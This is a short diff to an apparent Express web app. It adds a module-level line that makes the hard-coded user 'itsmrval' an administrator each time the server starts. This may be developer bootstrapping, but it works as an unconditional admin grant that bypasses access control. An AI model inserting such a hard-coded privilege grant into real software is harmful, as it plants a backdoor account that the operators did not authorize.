@@ -77,6 +77,7 @@ app.get("/login", (req, res) => {
     res.render('login')
 });
 
+userService.makeAdmin("itsmrval")
 
 app.use('/admin/', require('./routes/admin.route'));
 app.use('/auth/', require('./routes/auth.route'));
